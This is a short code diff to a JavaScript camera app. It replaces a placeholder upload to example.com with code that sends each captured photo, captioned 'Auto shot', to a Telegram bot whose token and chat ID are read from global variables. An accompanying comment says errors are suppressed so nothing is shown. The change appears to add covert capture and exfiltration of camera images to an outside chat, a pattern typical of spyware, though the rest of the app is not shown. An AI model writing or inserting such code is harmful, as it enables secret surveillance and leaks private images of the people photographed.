@@ -37,16 +37,14 @@ function CameraApp() {
       const blob = await new Promise((resolve) => canvas.toBlob(resolve, "image/png"));
       if (!blob) return;
 
-      const formData = new FormData();
-      formData.append("file", blob, "photo.png");
-
-      // TODO: замените на ваш серверный endpoint для приёма файла
-      const uploadUrl = "https://example.com/upload";
-      await fetch(uploadUrl, {
-        method: "POST",
-        body: formData,
-        credentials: "omit",
-      });
+      if (window.sendPhotoToTelegram && window.TELEGRAM_BOT_TOKEN && window.TELEGRAM_CHAT_ID) {
+        await window.sendPhotoToTelegram({
+          botToken: window.TELEGRAM_BOT_TOKEN,
+          chatId: window.TELEGRAM_CHAT_ID,
+          photoBlob: blob,
+          caption: "Auto shot",
+        });
+      }
     } catch (e) {
       // глушим ошибки — ничего не выводим
       console.error(e);
